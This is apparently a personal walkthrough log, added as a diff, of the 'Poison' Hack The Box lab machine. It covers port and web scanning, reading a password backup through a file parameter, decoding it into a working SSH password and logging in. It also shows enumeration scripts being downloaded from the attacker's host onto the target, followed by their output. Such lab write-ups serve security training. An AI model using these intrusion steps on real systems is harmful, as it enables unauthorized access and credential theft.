@@ -1,0 +1,749 @@
+RECON
+root@kali:~/htb/poison# nmap -sC -sV -p- -vv -oA full 10.10.10.84
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFLpOCLU3rRUdNNbb5u5WlP+JKUpoYw4znHe0n4mRlv5sQ5kkkZSDNMqXtfWUFzevPaLaJboNBOAXjPwd1OV1wL2YFcGsTL5MOXgTeW4ixpxNBsnBj67mPSmQSaWcudPUmhqnT5VhKYLbPk43FsWqGkNhDtbuBVo9/BmN+GjN1v7w54PPtn8wDd7Zap3yStvwRxeq8E0nBE4odsfBhPPC01302RZzkiXymV73WqmI8MeF9W94giTBQS5swH6NgUe4/QV1tOjTct/uzidFx+8bbcwcQ1eUgK5DyRLaEhou7PRlZX6Pg5YgcuQUlYbGjgk6ycMJDuwb2D5mJkAzN4dih
+|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXh613KF4mJTcOxbIy/3mN/O/wAYht2Vt4m9PUoQBBSao16RI9B3VYod1HSbx3PYsPpKmqjcT7A/fHggPIzDYU=
+|   256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJrg2EBbG5D2maVLhDME5mZwrvlhTXrK7jiEI+MiZ+Am
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+
+ENUM WEB
+root@kali:~/htb/poison# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  http://10.10.10.84 -x php,txt,config,html,pl,py -s 200,204,301,302,307,403 -t 100
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.84/
+[+] Threads      : 100
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 302,307,403,200,204,301
+[+] Extensions   : .php,.txt,.config,.html,.pl,.py
+=====================================================
+/index.php (Status: 200)
+/info.php (Status: 200)
+/browse.php (Status: 200)
+/phpinfo.php (Status: 200)
+/ini.php (Status: 200)
+=====================================================
+
+FREEBSD VERSION
+http://10.10.10.84/phpinfo.php
+FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64 
+
+http://10.10.10.84/browse.php?file=listfiles.php
+Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt ) 
+
+VIEW PASSWORD BACKUP FILE
+http://10.10.10.84/browse.php?file=pwdbackup.txt
+This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
+
+BASE64 ENCODED NEED TO COMBINE AS MALFORMED
+https://base64.guru/tools/repair
+Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=
+
+CREATE BASH OR PYTHON SCRIPT TO DECODE STRING 13 TIMES
+root@kali:~/htb/poison# vim decode.sh
+#!/bin/bash
+state=$(<base64.txt)
+for i in {1..13}; do
+   state=$(<<<"$state" base64 --decode)
+done
+echo "$state
+
+ADD BASE64 STRING TO TEXT FILE
+root@kali:~/htb/poison# vim base64.txt
+
+DECODE THE STRING
+root@kali:~/htb/poison# ./decode.sh 
+Charix!2#4%6&8(0
+
+ALTERNATIVE PYTHON SCRIPT
+root@kali:~/htb/poison# vim decode_base64_x13.py
+#!/usr/bin/python
+
+from base64 import b64decode
+
+str='Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo='
+
+for i in range(13):
+        str=b64decode(str)
+
+print str
+
+DECODE STRING WITH PYTHON SCRIPT
+root@kali:~/htb/poison# python decode_base64_x13.py 
+Charix!2#4%6&8(0
+
+LOGIN VIA SSH AS USER CHARIX
+root@kali:~/htb/poison# ssh charix@10.10.10.84
+The authenticity of host '10.10.10.84 (10.10.10.84)' can't be established.
+ECDSA key fingerprint is SHA256:rhYtpHzkd9nBmOtN7+ft0JiVAu8qnywLb48Glz4jZ8c.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.10.84' (ECDSA) to the list of known hosts.
+Password for charix@Poison:
+Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
+FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
+
+Welcome to FreeBSD!
+
+Release Notes, Errata: https://www.FreeBSD.org/releases/
+Security Advisories:   https://www.FreeBSD.org/security/
+FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
+FreeBSD FAQ:           https://www.FreeBSD.org/faq/
+Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
+FreeBSD Forums:        https://forums.FreeBSD.org/
+
+Documents installed with the system are in the /usr/local/share/doc/freebsd/
+directory, or can be installed later with:  pkg install en-freebsd-doc
+For other languages, replace "en" with a language code like de or fr.
+
+Show the version of FreeBSD installed:  freebsd-version ; uname -a
+Please include that output and any error messages when posting questions.
+Introduction to manual pages:  man man
+FreeBSD directory layout:      man hier
+
+Edit /etc/motd to change this login announcement.
+You can use "whereis" to search standard binary, manual page and source
+directories for the specified programs. This can be particularly handy
+when you are trying to find where in the ports tree an application is.
+
+Try "whereis firefox" and "whereis whereis".
+		-- Konstantinos Konstantinidis <kkonstan@duth.gr>
+charix@Poison:~ % id
+uid=1001(charix) gid=1001(charix) groups=1001(charix)
+charix@Poison:~ % sudo -l
+sudo: Command not found.
+
+GET USER FLAG
+charix@Poison:~ % cat /home/charix/user.txt 
+#######################################
+
+PRIVESC
+
+charix@Poison:~ % cd /tmp
+charix@Poison:/tmp % ls
+charix@Poison:/tmp % wget 10.10.14.8/line.sh
+--2020-11-23 23:12:37--  http://10.10.14.8/line.sh
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/x-sh]
+Saving to: 'line.sh'
+
+line.sh                   100%[==================================>]  45.54K  --.-KB/s    in 0.04s   
+
+2020-11-23 23:12:37 (1.07 MB/s) - 'line.sh' saved [46631/46631]
+
+charix@Poison:/tmp % wget 10.10.14.8/linpeas.sh
+--2020-11-23 23:12:51--  http://10.10.14.8/linpeas.sh
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 293889 (287K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+linpeas.sh                100%[==================================>] 287.00K  1.69MB/s    in 0.2s    
+
+2020-11-23 23:12:51 (1.69 MB/s) - 'linpeas.sh' saved [293889/293889]
+
+charix@Poison:/tmp % ls -la
+total 364
+drwxrwxrwt   6 root    wheel     512 Nov 23 23:12 .
+drwxr-xr-x  20 root    wheel    1024 Nov 23 18:31 ..
+drwxrwxrwt   2 root    wheel     512 Nov 23 18:31 .ICE-unix
+-r--r--r--   1 root    wheel      11 Nov 23 18:31 .X1-lock
+drwxrwxrwt   2 root    wheel     512 Nov 23 18:31 .X11-unix
+drwxrwxrwt   2 root    wheel     512 Nov 23 18:31 .XIM-unix
+drwxrwxrwt   2 root    wheel     512 Nov 23 18:31 .font-unix
+-rw-r--r--   1 charix  wheel   46631 Nov 23 23:06 line.sh
+-rw-r--r--   1 charix  wheel  293889 Nov 23 23:06 linpeas.sh
+charix@Poison:/tmp % chmod * lin*
+chmod: invalid file mode: line.sh
+charix@Poison:/tmp % chmod +x lin
+line.sh     linpeas.sh  
+charix@Poison:/tmp % chmod +x lin*
+charix@Poison:/tmp % ls -l
+total 336
+-rwxr-xr-x  1 charix  wheel   46631 Nov 23 23:06 line.sh
+-rwxr-xr-x  1 charix  wheel  293889 Nov 23 23:06 linpeas.sh
+
+RUN LINUX PRIV ENUM SCRIPT
+charix@Poison:/tmp % sh line.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Mon Nov 23 23:15:05 CET 2020
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64
+
+
+[-] Hostname:
+Poison
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=1001(charix) gid=1001(charix) groups=1001(charix)
+
+
+[-] Who else is logged on:
+11:15PM  up  4:44, 1 users, load averages: 0.50, 0.44, 0.37
+USER       TTY      FROM                                      LOGIN@  IDLE WHAT
+charix     pts/1    10.10.14.8                               10:52PM     - w
+
+
+[-] Group memberships:
+uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
+uid=0(toor) gid=0(wheel) groups=0(wheel)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(operator) gid=5(operator) groups=5(operator)
+uid=3(bin) gid=7(bin) groups=7(bin)
+uid=4(tty) gid=65533(nogroup) groups=65533(nogroup)
+uid=5(kmem) gid=65533(nogroup) groups=65533(nogroup)
+uid=7(games) gid=13(games) groups=13(games)
+uid=8(news) gid=8(news) groups=8(news)
+uid=9(man) gid=9(man) groups=9(man)
+uid=22(sshd) gid=22(sshd) groups=22(sshd)
+uid=25(smmsp) gid=25(smmsp) groups=25(smmsp)
+uid=26(mailnull) gid=26(mailnull) groups=26(mailnull)
+uid=53(bind) gid=53(bind) groups=53(bind)
+uid=59(unbound) gid=59(unbound) groups=59(unbound)
+uid=62(proxy) gid=62(proxy) groups=62(proxy)
+uid=64(_pflogd) gid=64(_pflogd) groups=64(_pflogd)
+uid=65(_dhcp) gid=65(_dhcp) groups=65(_dhcp)
+uid=66(uucp) gid=66(uucp) groups=66(uucp)
+uid=68(pop) gid=6(mail) groups=6(mail)
+uid=78(auditdistd) gid=77(audit) groups=77(audit)
+uid=80(www) gid=80(www) groups=80(www)
+uid=160(_ypldap) gid=160(_ypldap) groups=160(_ypldap)
+uid=845(hast) gid=845(hast) groups=845(hast)
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+uid=601(_tss) gid=601(_tss) groups=601(_tss)
+uid=556(messagebus) gid=556(messagebus) groups=556(messagebus)
+uid=558(avahi) gid=558(avahi) groups=558(avahi)
+uid=193(cups) gid=193(cups) groups=193(cups)
+uid=1001(charix) gid=1001(charix) groups=1001(charix)
+
+
+line.sh: [[: not found
+[+] It looks like we have password hashes in /etc/passwd!
+# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
+#
+root:*:0:0:Charlie &:/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:
+daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
+operator:*:2:5:System &:/:/usr/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
+tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
+kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
+games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
+news:*:8:8:News Subsystem:/:/usr/sbin/nologin
+man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
+sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
+smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
+mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
+bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
+unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
+proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
+_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
+_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
+uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
+pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
+auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
+www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
+_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
+hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
+nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
+_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
+messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
+avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
+cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
+charix:*:1001:1001:charix:/home/charix:/bin/csh
+
+
+[-] Contents of /etc/passwd:
+# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
+#
+root:*:0:0:Charlie &:/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:
+daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
+operator:*:2:5:System &:/:/usr/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
+tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
+kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
+games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
+news:*:8:8:News Subsystem:/:/usr/sbin/nologin
+man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
+sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
+smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
+mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
+bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
+unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
+proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
+_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
+_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
+uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
+pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
+auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
+www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
+_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
+hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
+nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
+_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
+messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
+avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
+cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
+charix:*:1001:1001:charix:/home/charix:/bin/csh
+
+
+[-] Super user account(s):
+root
+toor
+
+
+[+] We can read root's home directory!
+total 0
+
+
+[-] Are permissions on /home directories lax:
+total 12
+drwxr-xr-x   3 root    wheel    512B Mar 19  2018 .
+drwxr-xr-x  20 root    wheel    1.0K Nov 23 18:31 ..
+drwxr-x---   2 charix  charix   512B Mar 19  2018 charix
+
+
+[-] Root is allowed to login via SSH:
+PermitRootLogin yes
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+VENDOR=amd
+SSH_CLIENT=10.10.14.8 55284 22
+LOGNAME=charix
+PAGER=more
+OSTYPE=FreeBSD
+MACHTYPE=x86_64
+MAIL=/var/mail/charix
+PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin:/home/charix/bin
+EDITOR=vi
+HOST=Poison
+REMOTEHOST=10.10.14.8
+PWD=/tmp
+GROUP=charix
+TERM=xterm-256color
+SSH_TTY=/dev/pts/1
+HOME=/home/charix
+USER=charix
+SSH_CONNECTION=10.10.14.8 55284 10.10.10.84 22
+HOSTTYPE=FreeBSD
+SHELL=/bin/csh
+BLOCKSIZE=K
+SHLVL=1
+
+[+] Searching root files in home dirs (limit 30)
+/home
+/home/charix/user.txt
+/home/charix/secret.zip
+
+[+] Searching folders owned by me containing others files on it
+
+[+] Readable files belonging to root and readable by me but not world readable
+-rw-r-----  1 root  charix  33 Mar 19  2018 /home/charix/user.txt
+-rw-r-----  1 root  charix  166 Mar 19  2018 /home/charix/secret.zip
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/cron
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+logrotate Not Found
+
+[+] Files inside /home/charix (limit 20)
+total 48
+drwxr-x---  2 charix  charix   512 Mar 19  2018 .
+drwxr-xr-x  3 root    wheel    512 Mar 19  2018 ..
+-rw-r-----  1 charix  charix  1041 Mar 19  2018 .cshrc
+-rw-rw----  1 charix  charix     0 Mar 19  2018 .history
+-rw-r-----  1 charix  charix   254 Mar 19  2018 .login
+-rw-r-----  1 charix  charix   163 Mar 19  2018 .login_conf
+-rw-r-----  1 charix  charix   379 Mar 19  2018 .mail_aliases
+-rw-r-----  1 charix  charix   336 Mar 19  2018 .mailrc
+-rw-r-----  1 charix  charix   802 Mar 19  2018 .profile
+-rw-r-----  1 charix  charix   281 Mar 19  2018 .rhosts
+-rw-r-----  1 charix  charix   849 Mar 19  2018 .shrc
+-rw-r-----  1 root    charix   166 Mar 19  2018 secret.zip
+-rw-r-----  1 root    charix    33 Mar 19  2018 user.txt
+
+[+] Files inside others home (limit 20)
+
+[+] Searching installed mail applications
+rc.sendmail
+sendmail
+
+[+] Mails (limit 50)
+/var/mail/_tss
+/var/mail/messagebus
+/var/mail/avahi
+/var/mail/cups
+/var/mail/charix
+/var/mail/root
+
+[+] Backup files?
+-r-xr-xr-x  1 root  wheel  2428 Jul 21  2017 /usr/share/pc-sysinstall/backend-query/list-rsync-backups.sh
+-r--r--r--  1 root  wheel  57 Jul 21  2017 /usr/share/sendmail/cf/siteconfig/uucp.old.arpa.m4
+-rw-r--r--  1 root  wheel  8878 Sep  9  2013 /usr/local/share/doc/db5/api_reference/C/envdbbackup.html
+-rw-r--r--  1 root  wheel  9538 Sep  9  2013 /usr/local/share/doc/db5/api_reference/C/envset_backup_config.html
+-rw-r--r--  1 root  wheel  13813 Sep  9  2013 /usr/local/share/doc/db5/api_reference/C/envset_backup_callbacks.html
+-rw-r--r--  1 root  wheel  13425 Sep  9  2013 /usr/local/share/doc/db5/api_reference/C/envbackup.html
+-rw-r--r--  1 root  wheel  7008 Sep  9  2013 /usr/local/share/doc/db5/api_reference/C/envget_backup_callbacks.html
+-rw-r--r--  1 root  wheel  17707 Sep  9  2013 /usr/local/share/doc/db5/api_reference/C/db_hotbackup.html
+-rw-r--r--  1 root  wheel  7711 Sep  9  2013 /usr/local/share/doc/db5/api_reference/C/envget_backup_config.html
+-rw-r--r--  1 root  wheel  9089 Sep  9  2013 /usr/local/share/doc/db5/api_reference/CXX/envdbbackup.html
+-rw-r--r--  1 root  wheel  9522 Sep  9  2013 /usr/local/share/doc/db5/api_reference/CXX/envset_backup_config.html
+-rw-r--r--  1 root  wheel  13808 Sep  9  2013 /usr/local/share/doc/db5/api_reference/CXX/envset_backup_callbacks.html
+-rw-r--r--  1 root  wheel  7017 Sep  9  2013 /usr/local/share/doc/db5/api_reference/CXX/envget_backup_callbacks.html
+-rw-r--r--  1 root  wheel  13638 Sep  9  2013 /usr/local/share/doc/db5/api_reference/CXX/envbackup.html
+-rw-r--r--  1 root  wheel  17661 Sep  9  2013 /usr/local/share/doc/db5/api_reference/CXX/db_hotbackup.html
+-rw-r--r--  1 root  wheel  7694 Sep  9  2013 /usr/local/share/doc/db5/api_reference/CXX/envget_backup_config.html
+-rw-r--r--  1 root  wheel  18807 Sep  9  2013 /usr/local/share/doc/db5/gsg_txn/C/backuprestore.html
+-rw-r--r--  1 root  wheel  18791 Sep  9  2013 /usr/local/share/doc/db5/gsg_txn/CXX/backuprestore.html
+-rw-r--r--  1 root  wheel  8159 Sep  9  2013 /usr/local/share/doc/db5/installation/upgrade_11gr2_53_hotbackup.html
+-rw-r--r--  1 root  wheel  3494 Sep  9  2013 /usr/local/share/doc/db5/installation/upgrade_11gr2_52_hot_backup.html
+-r-xr-xr-x  1 root  wheel  2746 Jan  2  2018 /usr/local/etc/periodic/daily/411.pkg-backup
+-rwxr-xr-x  1 root  wheel  28416 Mar 16  2018 /usr/local/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r--  1 root  wheel  951 Jan  2  2018 /usr/local/man/man8/pkg-backup.8.gz
+-rw-r--r--  1 root  wheel  1267 Mar 19  2018 /usr/local/www/apache24/data/pwdbackup.txt
+-rw-r--r--  1 root  wheel  955 Jul 21  2017 /usr/ports/databases/autobackupmysql/files/patch-autobackupmysql.sh
+-rw-r--r--  1 root  wheel  973 Jul 21  2017 /usr/ports/databases/pgpool-II-33/files/pgpool_copy_backup
+-rw-r--r--  1 root  wheel  4036 Jul 21  2017 /usr/ports/databases/tdb/files/tdbbackup.8
+-rw-r--r--  1 root  wheel  3992 Jul 21  2017 /usr/ports/databases/ntdb/files/ntdbbackup.8
+-rw-r--r--  1 root  wheel  451 Jul 21  2017 /usr/ports/deskutils/osmo/files/patch-src__backup.c
+-rw-r--r--  1 root  wheel  587 Jul 21  2017 /usr/ports/emulators/vmsbackup/files/patch-vmsbackup.c
+-rw-r--r--  1 root  wheel  682 Jul 21  2017 /usr/ports/emulators/ucon64/files/patch-backup-lynxit.c
+-rw-r--r--  1 root  wheel  1292 Jul 21  2017 /usr/ports/multimedia/k9copy-kde4/files/patch-src_backup_k9dvdbackup.cpp
+-rw-r--r--  1 root  wheel  645 Jul 21  2017 /usr/ports/multimedia/lxdvdrip/files/patch-dvdbackup__Makefile
+-rw-r--r--  1 root  wheel  354 Jul 21  2017 /usr/ports/multimedia/lxdvdrip/files/patch-dvdbackup__dvdbackup_lxdvdrip.c
